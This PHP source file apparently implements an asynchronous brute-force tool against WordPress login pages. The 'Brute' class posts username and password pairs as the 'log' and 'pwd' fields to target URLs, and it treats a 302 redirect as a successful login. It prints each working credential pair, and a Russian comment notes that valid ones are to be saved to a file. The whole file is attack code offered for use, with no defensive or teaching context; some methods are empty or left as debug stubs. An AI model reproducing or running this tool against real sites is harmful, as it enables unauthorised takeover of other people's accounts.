<?php

namespace app;

use Amp\Dns\DnsException;
use Amp\Http\Client\Body\FormBody;
use Amp\Http\Client\HttpClientBuilder;
use Amp\Http\Client\Request;

class Brute
{
    protected $client;

    private $url;
    private $login;
    private $password;
    private $iteration;

    public function __construct()
    {
        $this->client = (new HttpClientBuilder())
            ->retry(3)
            ->followRedirects(0)
            ->build();

        $this->iteration = true;
    }

    public function __invoke($data)
    {
        $this->password = $data['password'];
        $this->url = explode(';', $data['url'])[0];

        $this->loginCheck($data);
        $this->checkIterator($data['login']);


        $body = new FormBody;
        $body->addField('log', $this->login);
        $body->addField('pwd', $this->password);

        $request = new Request($this->url, 'POST');
        $request->setTcpConnectTimeout(2400);
        $request->setBody($body);

        $response = yield $this->client->request($request);

        if ($response->getStatus() == 302) {
            echo $this->login . ":" . $this->password . PHP_EOL;
            // тут пишем valid в файл
        }

    }

    public function loginCheck($data) {
        if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
            $this->login = null;
        } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
            $this->login = explode(';', $data['url'])[1];
        } else {
            $this->login = $data['login'];
        }
    }

    public function checkIterator($login) {

    }

    public function request($url) {
        $request = new Request($url);
        $request->setTcpConnectTimeout(2400);

        $response = yield $this->client->request($request);

        print_r($response);die;
    }
}